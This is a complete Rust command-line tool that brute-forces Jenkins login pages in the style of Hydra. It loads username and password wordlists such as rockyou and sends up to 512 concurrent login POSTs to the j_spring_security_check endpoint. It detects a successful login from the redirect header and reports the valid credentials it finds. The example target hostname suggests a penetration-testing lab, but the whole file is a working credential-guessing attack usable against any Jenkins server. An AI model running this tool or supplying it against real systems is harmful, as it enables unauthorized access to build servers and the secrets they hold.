use anyhow::{bail, Context, Result};
use clap::Parser;
use rayon::prelude::*;
use rayon::ThreadPoolBuilder;
use std::collections::HashSet;
use std::fs::File;
use std::io::{BufRead, BufReader, Write};
use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
use std::sync::Arc;
use std::time::Duration;
use reqwest::blocking::{Client, Response};

/// Hydra‑style Jenkins brute‑forcer (configurable login POST path)
#[derive(Parser, Debug)]
#[command(
    version,
    about = "Brute‑force Jenkins login with -L/-l and -P/-p",
    after_help = "Credentials:\n  -l = one username   -L = file of usernames (uppercase)\n  -p = one password   -P = file of passwords (uppercase)\n\nRequires --url, at least one of -l/-L, and at least one of -p/-P."
)]
struct Args {
    /// Target Jenkins base URL (e.g., http://jenkins.inlanefreight.local:8000)
    #[arg(short = 'u', long = "url", required = true, value_name = "URL")]
    url: String,

    /// Login form POST path (varies by Jenkins version; e.g. j_spring_security_check, j_acegi_security_check)
    #[arg(short = 'e', long, default_value = "j_spring_security_check", value_name = "PATH")]
    endpoint: String,

    /// Single username (like hydra -l)
    #[arg(short = 'l', long, value_name = "USERNAME")]
    user: Option<String>,

    /// File of usernames (like hydra -L)
    #[arg(short = 'L', long, value_name = "USERFILE")]
    user_file: Option<String>,

    /// Single password (like hydra -p)
    #[arg(short = 'p', long, value_name = "PASSWORD")]
    password: Option<String>,

    /// File of passwords (like hydra -P)
    #[arg(short = 'P', long, value_name = "PASSFILE")]
    pass_file: Option<String>,

    /// Concurrent workers (Rayon). Login checks are I/O bound; default is CPU×8 (min 32, max 512).
    #[arg(short = 't', long, value_name = "N")]
    threads: Option<usize>,
}

/// Line-based wordlists often contain invalid UTF-8 (e.g. rockyou). Decode lossily per line.
fn load_wordlist(path: &str, option_label: &str) -> Result<Vec<String>> {
    let file = File::open(path).with_context(|| format!("{option_label}: cannot open {path:?}"))?;
    let reader = BufReader::new(file);
    let mut lines = Vec::new();
    for chunk in reader.split(b'\n') {
        let chunk = chunk.with_context(|| format!("{option_label}: read error in {path:?}"))?;
        let s = String::from_utf8_lossy(&chunk)
            .trim_end_matches('\r')
            .to_string();
        if !s.is_empty() {
            lines.push(s);
        }
    }
    Ok(lines)
}

fn target_login(
    client: &Client,
    base_url: &str,
    login_path: &str,
    username: &str,
    password: &str,
) -> Result<bool> {
    let path = login_path.trim().trim_matches('/');
    let url = format!("{}/{}", base_url.trim_end_matches('/'), path);

    let mut form = std::collections::HashMap::new();
    form.insert("j_username", username);
    form.insert("j_password", password);
    form.insert("from", "");
    form.insert("Submit", "Sign in");

    let res: Response = client.post(&url).form(&form).send()?;

    let location = res.headers().get("Location");

    match location {
        Some(loc) => {
            let loc_str = loc.to_str().unwrap_or("");
            Ok(loc_str.trim_end_matches('/').is_empty() || loc_str.ends_with("/"))
        }
        None => Ok(false),
    }
}

/// Live `[current:total]` on stderr; throttled redraws so huge runs stay responsive.
struct Progress {
    done: AtomicUsize,
    total: usize,
}

impl Progress {
    fn new(total: usize) -> Self {
        Self {
            done: AtomicUsize::new(0),
            total,
        }
    }

    fn bump(&self) {
        let cur = self.done.fetch_add(1, Ordering::Relaxed) + 1;
        let total = self.total;
        let step = (total / 1000).max(1);
        if cur == 1 || cur % step == 0 || cur == total {
            eprint!("\r\x1b[K[*] [{cur}:{total}]");
            let _ = std::io::stderr().flush();
        }
    }

    fn finish_line(&self) {
        let cur = self.done.load(Ordering::Relaxed);
        eprint!("\r\x1b[K[*] [{cur}:{}]\n", self.total);
        let _ = std::io::stderr().flush();
    }
}

fn main() {
    if let Err(e) = run() {
        eprintln!("Error: {:#}", e);
        std::process::exit(1);
    }
}

fn run() -> Result<()> {
    let args = Args::parse();

    let url = args.url.trim();
    if url.is_empty() {
        bail!("--url must not be empty");
    }
    if !(url.starts_with("http://") || url.starts_with("https://")) {
        bail!(
            "--url must start with http:// or https:// (got: {url:?})\n\
             Example: --url http://jenkins.example:8080"
        );
    }
    let url = url.trim_end_matches('/');

    let endpoint = args.endpoint.trim().trim_matches('/').to_string();
    if endpoint.is_empty() {
        bail!("--endpoint must not be empty (use default or e.g. j_acegi_security_check)");
    }

    let has_user_source = args.user.is_some() || args.user_file.is_some();
    let has_pass_source = args.password.is_some() || args.pass_file.is_some();

    if !has_user_source {
        bail!(
            "no usernames provided.\n\
             \n\
             You need at least one of:\n\
               -l, --user <NAME>        single username (lowercase L)\n\
               -L, --user-file <PATH>   file with one username per line (uppercase L)\n\
             \n\
             Tip: -L is the wordlist file; -l is one name. Example:\n\
               --url http://... -l admin -P passwords.txt"
        );
    }
    if !has_pass_source {
        bail!(
            "no passwords provided.\n\
             \n\
             You need at least one of:\n\
               -p, --password <PASS>    single password (lowercase p)\n\
               -P, --pass-file <PATH>   file with one password per line (uppercase P)\n\
             \n\
             Tip: -P is the wordlist file; -p is one password. Example:\n\
               --url http://... -l admin -P rockyou.txt"
        );
    }

    if let Some(ref u) = args.user {
        if u.trim().is_empty() {
            bail!(
                "-l/--user value is empty.\n\
                 Provide a non-empty username, or remove -l and use only -L <file>."
            );
        }
    }
    if let Some(ref p) = args.password {
        if p.trim().is_empty() {
            bail!(
                "-p/--password value is empty.\n\
                 Provide a non-empty password, or remove -p and use only -P <file>."
            );
        }
    }

    // 1. Users
    let mut users = Vec::new();
    if let Some(u) = args.user.clone() {
        users.push(u.trim().to_string());
    }
    if let Some(ref path) = args.user_file {
        let from_file = load_wordlist(path, "-L / --user-file")?;
        if from_file.is_empty() && args.user.is_none() {
            bail!(
                "user wordlist {path:?} has no non-empty lines (file empty or only blank lines).\n\
                 You passed -L but no -l; add usernames to the file or use -l <user>."
            );
        }
        users.extend(from_file);
    }

    // 2. Passwords
    let mut passwords = Vec::new();
    if let Some(p) = args.password.clone() {
        passwords.push(p.trim().to_string());
    }
    if let Some(ref path) = args.pass_file {
        let from_file = load_wordlist(path, "-P / --pass-file")?;
        if from_file.is_empty() && args.password.is_none() {
            bail!(
                "password wordlist {path:?} has no non-empty lines (file empty or only blank lines).\n\
                 You passed -P but no -p; add passwords to the file or use -p <password>."
            );
        }
        passwords.extend(from_file);
    }

    let users: Vec<String> = {
        let set: HashSet<_> = users.into_iter().collect();
        let mut v: Vec<_> = set.into_iter().collect();
        v.sort();
        v
    };
    let passwords: Vec<String> = {
        let set: HashSet<_> = passwords.into_iter().collect();
        let mut v: Vec<_> = set.into_iter().collect();
        v.sort();
        v
    };

    if users.is_empty() {
        bail!(
            "no usernames to try after loading lists (all duplicates removed, or invalid input).\n\
             Check -l / -L and file contents."
        );
    }
    if passwords.is_empty() {
        bail!(
            "no passwords to try after loading lists (all duplicates removed, or invalid input).\n\
             Check -p / -P and file contents."
        );
    }

    let num_threads = match args.threads {
        Some(0) => {
            bail!("--threads must be at least 1 (got 0)");
        }
        Some(n) => n,
        None => {
            let cpus = num_cpus::get().max(1);
            cpus.saturating_mul(8).clamp(32, 512)
        }
    };
    let pool = ThreadPoolBuilder::new()
        .num_threads(num_threads)
        .build()
        .map_err(|e| anyhow::anyhow!("rayon thread pool: {e}"))?;

    let client = Client::builder()
        .timeout(Duration::from_secs(10))
        .connect_timeout(Duration::from_secs(10))
        .redirect(reqwest::redirect::Policy::none())
        .build()?;

    println!(
        "[*] Target: {}",
        url
    );
    println!("[*] Login endpoint: /{}", endpoint);
    println!(
        "[*] Trying {} users × {} passwords",
        users.len(),
        passwords.len()
    );
    println!("[*] Using {} threads", num_threads);

    let total_attempts = users.len().saturating_mul(passwords.len());
    let progress = Arc::new(Progress::new(total_attempts));

    let mut found = false;
    let stop = Arc::new(AtomicBool::new(false));
    let passwords = Arc::new(passwords);

    for user in &users {
        if found {
            break;
        }

        let user = user.clone();
        let endpoint = endpoint.clone();
        let passwords = Arc::clone(&passwords);
        let progress = Arc::clone(&progress);

        let hit = pool.install(|| {
            passwords.par_iter().find_any(|pass| {
                if stop.load(Ordering::Relaxed) {
                    return false;
                }
                progress.bump();
                match target_login(&client, url, &endpoint, &user, pass.as_str()) {
                    Ok(true) => {
                        stop.store(true, Ordering::Relaxed);
                        progress.finish_line();
                        println!("[+] VALID CREDENTIALS: {} / {}", user, pass);
                        true
                    }
                    Ok(false) | Err(_) => false,
                }
            })
        });

        if hit.is_some() {
            found = true;
            break;
        }
    }

    if !found {
        progress.finish_line();
        println!("[!] No valid credentials found.");
    }

    Ok(())
}
